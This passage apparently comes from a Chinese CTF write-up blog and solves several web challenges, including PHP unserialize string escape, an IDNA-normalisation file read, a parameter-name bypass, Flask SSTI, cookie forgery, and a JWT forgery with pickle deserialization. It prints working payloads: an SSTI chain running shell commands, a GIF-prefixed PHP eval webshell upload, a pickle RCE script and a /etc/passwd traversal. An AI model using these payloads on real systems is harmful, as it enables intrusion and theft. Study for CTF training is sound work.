</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">mysql_query</span>($sql);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">filter</span>($string) {
</span></span><span style="display:flex;"><span>		$escape <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;\&#39;&#39;</span>, <span style="color:#e6db74">&#39;\\\\&#39;</span>);
</span></span><span style="display:flex;"><span>		$escape <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;|&#39;</span>, $escape) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span>;  <span style="color:#75715e">// $escape = &#39;/\|\\\\/&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		$string <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>($escape, <span style="color:#e6db74">&#39;_&#39;</span>, $string);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		$safe <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;select&#39;</span>, <span style="color:#e6db74">&#39;insert&#39;</span>, <span style="color:#e6db74">&#39;update&#39;</span>, <span style="color:#e6db74">&#39;delete&#39;</span>, <span style="color:#e6db74">&#39;where&#39;</span>);  
</span></span><span style="display:flex;"><span>		$safe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;|&#39;</span>, $safe) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/i&#39;</span>;  <span style="color:#75715e">// $safe = &#39;/select|insert|update|delete|where/i&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">preg_replace</span>($safe, <span style="color:#e6db74">&#39;hacker&#39;</span>, $string);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__tostring</span>() {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">__class__</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span>$user <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">user</span>();
</span></span><span style="display:flex;"><span>$user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">connect</span>($config);
</span></span></code></pre></div><p>PHP版本为5.6.40，主要关注update.php中的序列化，profile.php中的反序列化以及class.php中的filter函数，登录注册等页面都不存在sql注入。尝试在profile.php中获取到config.php的文件内容，但是update.php中的photo无法通过传参控制，结合class.php中filter函数对过滤字符where更换为hacker的操作，导致字符变多，考虑利用 <strong>数组绕过preg_match+数组绕过strlen+字符串逃逸</strong> 的方法在nickname处恶意构造序列化字符串：</p>
<pre tabindex="0"><code>------geckoformboundary1ede678c1f95225cf35256bb0ab372c1
Content-Disposition: form-data; name=&#34;phone&#34;

12345678901
------geckoformboundary1ede678c1f95225cf35256bb0ab372c1
Content-Disposition: form-data; name=&#34;email&#34;

114514@qq.com
------geckoformboundary1ede678c1f95225cf35256bb0ab372c1
Content-Disposition: form-data; name=&#34;nickname[]&#34;

wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&#34;;}s:5:&#34;photo&#34;;s:10:&#34;config.php&#34;;}
------geckoformboundary1ede678c1f95225cf35256bb0ab372c1
Content-Disposition: form-data; name=&#34;photo&#34;; filename=&#34;test.php&#34;
Content-Type: application/php

testtesttest
------geckoformboundary1ede678c1f95225cf35256bb0ab372c1--
</code></pre><p>访问profile.php就可以获取base64数据流，解码可得config.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$config[<span style="color:#e6db74">&#39;hostname&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>;
</span></span><span style="display:flex;"><span>$config[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;root&#39;</span>;
</span></span><span style="display:flex;"><span>$config[<span style="color:#e6db74">&#39;password&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qwertyuiop&#39;</span>;
</span></span><span style="display:flex;"><span>$config[<span style="color:#e6db74">&#39;database&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;challenges&#39;</span>;
</span></span><span style="display:flex;"><span>$flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{4ca493b0-6039-4a8e-9dae-6dd61a58d279}&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p><a href="https://3v4l.org/YiJsq#v5.6.4">多版本PHP环境在线测试</a></p>
<hr>
<h2 id="suctf-2019pythonginx">[SUCTF 2019]Pythonginx<a hidden class="anchor" aria-hidden="true" href="#suctf-2019pythonginx">#</a></h2>
<p>本题的环境好像已经无法获取flag了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/getUrl&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getUrl</span>():
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;url&#34;</span>)
</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> parse<span style="color:#f92672">.</span>urlparse(url)<span style="color:#f92672">.</span>hostname
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> host <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;suctf.cc&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;我扌 your problem? 111&#34;</span>
</span></span><span style="display:flex;"><span>    parts <span style="color:#f92672">=</span> list(urlsplit(url))
</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> parts[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> host <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;suctf.cc&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;我扌 your problem? 222 &#34;</span> <span style="color:#f92672">+</span> host
</span></span><span style="display:flex;"><span>    newhost <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> h <span style="color:#f92672">in</span> host<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>):
</span></span><span style="display:flex;"><span>        newhost<span style="color:#f92672">.</span>append(h<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;idna&#39;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>    parts[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>join(newhost)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#去掉 url 中的空格</span>
</span></span><span style="display:flex;"><span>    finalUrl <span style="color:#f92672">=</span> urlunsplit(parts)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> parse<span style="color:#f92672">.</span>urlparse(finalUrl)<span style="color:#f92672">.</span>hostname
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> host <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;suctf.cc&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> urllib<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>urlopen(finalUrl)<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;我扌 your problem? 333</span>
</span></span></code></pre></div><p>idna解析非ascii字符标准化问题：</p>
<pre tabindex="0"><code>file://suctf.ⅽc/../../../etc/passwd
</code></pre><p>相关工具：</p>
<p><a href="https://www.compart.com/en/unicode/">搜索相似的unicode字符网站</a></p>
<p><a href="https://github.com/h13t0ry/UnicodeToy">Unicode fuzzer</a></p>
<p>参考文章：</p>
<p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
<p><a href="https://www.tr0y.wang/2020/08/18/IDN/">https://www.tr0y.wang/2020/08/18/IDN/</a></p>
<hr>
<h2 id="mrctf2020套娃">[MRCTF2020]套娃<a hidden class="anchor" aria-hidden="true" href="#mrctf2020套娃">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$query <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;QUERY_STRING&#39;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">substr_count</span>($query, <span style="color:#e6db74">&#39;_&#39;</span>) <span style="color:#f92672">!==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">substr_count</span>($query, <span style="color:#e6db74">&#39;%5f&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> ){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Y0u are So cutE!&#39;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span>($_GET[<span style="color:#e6db74">&#39;b_u_p_t&#39;</span>] <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;23333&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^23333$/&#39;</span>, $_GET[<span style="color:#e6db74">&#39;b_u_p_t&#39;</span>])){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;you are going to the next ~&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>传参中不能出现下划线，但是php有将特殊符号参数名解析为下划线的特性，preg_match默认单行匹配不会匹配结尾的%0a即换行符：</p>
<pre tabindex="0"><code>?b+u+p+t=23333%0A
或?b u p t=23333%0A

how smart you are ~
FLAG is in secrettw.php 
</code></pre><p>secrettw.php页面源码注释中有一段jsfuck，控制台运行一下：</p>
<pre tabindex="0"><code>post me Merak
</code></pre><p>secrettw.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>); 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;takeip.php&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;open_basedir&#39;</span>,<span style="color:#e6db74">&#39;.&#39;</span>); 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;flag.php&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;Merak&#39;</span>])){ 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>); 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(); 
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">change</span>($v){ 
</span></span><span style="display:flex;"><span>    $v <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($v); 
</span></span><span style="display:flex;"><span>    $re <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($v);$i<span style="color:#f92672">++</span>){ 
</span></span><span style="display:flex;"><span>        $re <span style="color:#f92672">.=</span> <span style="color:#a6e22e">chr</span> ( <span style="color:#a6e22e">ord</span> ($v[$i]) <span style="color:#f92672">+</span> $i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> ); 
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $re; 
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Local access only!&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;br/&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> <span style="color:#a6e22e">getIp</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($ip<span style="color:#f92672">!=</span><span style="color:#e6db74">&#39;127.0.0.1&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Sorry,you don&#39;t have permission!  Your ip is :&#34;</span><span style="color:#f92672">.</span>$ip;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($ip <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">file_get_contents</span>($_GET[<span style="color:#e6db74">&#39;2333&#39;</span>]) <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;todat is a happy day&#39;</span> ){
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Your REQUEST is:&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">change</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>]);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#a6e22e">change</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>])); }
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">  
</span></span></span></code></pre></div><p>测试可知getIP检测的是Client-IP头：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#ae81ff">2333</span><span style="color:#f92672">=</span><span style="color:#a6e22e">data</span><span style="color:#f92672">://</span>,<span style="color:#a6e22e">todat</span><span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#a6e22e">is</span><span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#a6e22e">a</span><span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#a6e22e">happy</span><span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#a6e22e">day</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#a6e22e">ZmpdYSZmXGI</span><span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Flag</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">here</span><span style="color:#f92672">~</span><span style="color:#a6e22e">But</span> <span style="color:#a6e22e">how</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">get</span> <span style="color:#a6e22e">it</span><span style="color:#f92672">?</span><span style="color:#a6e22e">Local</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">only</span><span style="color:#f92672">!&lt;</span><span style="color:#a6e22e">br</span><span style="color:#f92672">/&gt;</span><span style="color:#a6e22e">Your</span> <span style="color:#a6e22e">REQUEST</span> <span style="color:#a6e22e">is</span><span style="color:#f92672">:</span><span style="color:#a6e22e">flag</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{902b4616-9d7d-49a9-9b98-1b5b1a15833a}&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Flag is here~But how to get it?&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>参考文章：</p>
<p><a href="https://www.cnblogs.com/hithub/p/16804708.html">https://www.cnblogs.com/hithub/p/16804708.html</a></p>
<hr>
<h2 id="cscctf-2019-qualflasklight">[CSCCTF 2019 Qual]FlaskLight<a hidden class="anchor" aria-hidden="true" href="#cscctf-2019-qualflasklight">#</a></h2>
<pre tabindex="0"><code>  &lt;!-- Parameter Name: search --&gt;
  &lt;!-- Method: GET --&gt;
</code></pre><p>测试了一下得知是python2：</p>
<p>waf过滤了global和system，用request.arg来绕过：</p>
<pre tabindex="0"><code>?search={{()[request.args.v1][request.args.v2][-1][request.args.v3]()[58][request.args.v4][request.args.v5][request.args.v6][request.args.v7](request.args.v8)}}&amp;v1=__class__&amp;v2=__mro__&amp;v3=__subclasses__&amp;v4=__init__&amp;v5=__globals__&amp;v6=__builtins__&amp;v7=eval&amp;v8=__import__(&#34;os&#34;).popen(&#34;cat /fla*/coomme_geeeett_youur_flek&#34;).read()
</code></pre><p>flag{b658a75b-8b7e-4298-907f-b06701d89bf8}</p>
<hr>
<h2 id="watevrctf-2019cookie-store">[watevrCTF-2019]Cookie Store<a hidden class="anchor" aria-hidden="true" href="#watevrctf-2019cookie-store">#</a></h2>
<p>Cookie中的session只经过base64编码，解码可得明文内容，伪造<code>money:100</code>即可，购买flag：</p>
<pre tabindex="0"><code>Set-Cookie: session=eyJtb25leSI6IDAsICJoaXN0b3J5IjogWyJZdW1teSBjaG9jb2xhdGUgY2hpcCBjb29raWUiLCAiZmxhZ3szMTM2YTZmNC03YjhlLTQ0MmUtYjFiYy00NzcyNzFlNzJkMDd9XG4iXX0=; 

{&#34;money&#34;: 0, &#34;history&#34;: [&#34;Yummy chocolate chip cookie&#34;, &#34;flag{3136a6f4-7b8e-442e-b1bc-477271e72d07}\n&#34;]}
</code></pre><hr>
<h2 id="wustctf2020cv-maker">[WUSTCTF2020]CV Maker<a hidden class="anchor" aria-hidden="true" href="#wustctf2020cv-maker">#</a></h2>
<p>登录成功后有个文件上传，上传空文件可以看到warning：</p>
<pre tabindex="0"><code>Warning: exif_imagetype(): Filename cannot be empty in /var/www/html/profile.php on line 76
</code></pre><p>查了一下exif_imagetype()，这个函数通过读取图像的前几个字节并检查其签名来工作，上传一句话木马：</p>
<pre tabindex="0"><code>Content-Disposition: form-data; name=&#34;upload_file&#34;; filename=&#34;shell.php&#34;
Content-Type: application/gif

GIF89a&lt;?php @eval($_POST[&#34;shell&#34;]); ?&gt;
</code></pre><p>蚁剑连上拿flag：flag{c976d3cc-196a-4b97-b6be-b4a8911c6e7d}</p>
<hr>
<h2 id="ciscn2019-华北赛区-day1-web2ikun">[CISCN2019 华北赛区 Day1 Web2]ikun<a hidden class="anchor" aria-hidden="true" href="#ciscn2019-华北赛区-day1-web2ikun">#</a></h2>
<p>网页中有一段话：</p>
<pre tabindex="0"><code>ikun们冲鸭,一定要买到lv6!!!
</code></pre><p>尝试先找到lv6的page页数：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://49170cc3-3b88-4c25-972e-e197bf95c016.node5.buuoj.cn:81/shop&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">500</span>):
</span></span><span style="display:flex;"><span>    params <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;page&#34;</span>:<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>}
</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, params)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#34;/static/img/lv/lv6.png&#34;</span> <span style="color:#f92672">in</span> resp<span style="color:#f92672">.</span>text):
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Found page: &#34;</span> <span style="color:#f92672">+</span> str(i))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Found page: 181</span>
</span></span></code></pre></div><p>购买前需要登录，直接买钱是不够的，抓包看一下，发现可以改折扣：</p>
<pre tabindex="0"><code>_xsrf=2%7C807606a1%7C9140beb256c835e2363761153abb462b%7C1755505534&amp;id=1624&amp;price=1145141919.0&amp;discount=0.00000001
</code></pre><p>之后会跳转到：/b1g_m4mber，不过只有admin才能访问，尝试伪造JWT，尝试爆破得到密钥：1Kun，修改username为admin：</p>
<pre tabindex="0"><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
</code></pre><p>网页源码给出了提示，存在备份文件:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/asd1f654e683wq/www.zip&#34;</span> &gt;&lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;visibility:hidden&#34;</span>&gt;删库跑路前我留了好东西在这里&lt;/<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
</span></span></code></pre></div><p>Admin.py中存在pickle反序列化漏洞：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> tornado.web
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sshop.base <span style="color:#f92672">import</span> BaseHandler
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AdminHandler</span>(BaseHandler):
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@tornado.web.authenticated</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>current_user <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;admin&#34;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>render(<span style="color:#e6db74">&#39;form.html&#39;</span>, res<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;This is Black Technology!&#39;</span>, member<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>render(<span style="color:#e6db74">&#39;no_ass.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@tornado.web.authenticated</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(self, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            become <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_argument(<span style="color:#e6db74">&#39;become&#39;</span>)
</span></span><span style="display:flex;"><span>            p <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>loads(urllib<span style="color:#f92672">.</span>unquote(become))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>render(<span style="color:#e6db74">&#39;form.html&#39;</span>, res<span style="color:#f92672">=</span>p, member<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>render(<span style="color:#e6db74">&#39;form.html&#39;</span>, res<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;This is Black Technology!&#39;</span>, member<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
</span></span></code></pre></div><hr>
<p>python2环境，exp.py：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib  <span style="color:#f92672">import</span> quote
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">payload</span>(object):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">return</span> (eval, (<span style="color:#e6db74">&#34;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&#34;</span>,))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(payload())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> quote(a)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(a)
</span></span></code></pre></div><p>补上_xsrf，传参become=c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</p>
<p>flag{e5e38db3-dd24-4248-81f0-02e9ae2fe8f0}</p>
<h2 id="红明谷ctf-2021write_shell">[红明谷CTF 2021]write_shell<a hidden class="anchor" aria-hidden="true" href="#红明谷ctf-2021write_shell">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>($input){
